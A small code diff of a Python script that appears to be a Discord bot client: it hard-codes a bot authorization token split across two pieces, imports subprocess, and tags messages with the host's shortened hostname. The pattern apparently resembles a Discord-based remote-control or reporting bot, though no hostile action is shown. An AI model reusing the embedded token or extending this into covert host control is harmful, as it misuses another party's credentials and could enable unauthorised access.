@@ -8,7 +8,7 @@ import subprocess
 result = 0
 tokenpart2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
 headers = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{tokenpart2}'}
-ID = socket.gethostname()
+ID = socket.gethostname().split('.')[0]
 
 def send_info(message):
 	message_data = {"content": message}
